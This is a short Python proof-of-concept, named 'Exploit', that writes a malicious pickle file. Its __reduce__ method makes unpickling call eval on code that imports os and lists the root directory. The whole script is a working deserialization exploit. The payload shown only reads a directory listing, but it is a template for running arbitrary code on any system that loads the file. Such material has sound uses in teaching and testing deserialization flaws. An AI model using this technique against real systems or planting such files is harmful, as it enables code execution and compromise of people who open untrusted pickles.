import pickle

class Exploit:
    def __reduce__(self):
        return (eval, ("str(__import__('os').listdir('/'))",))

with open("exploit.pkl", "wb") as f:
    pickle.dump({'data': Exploit()}, f)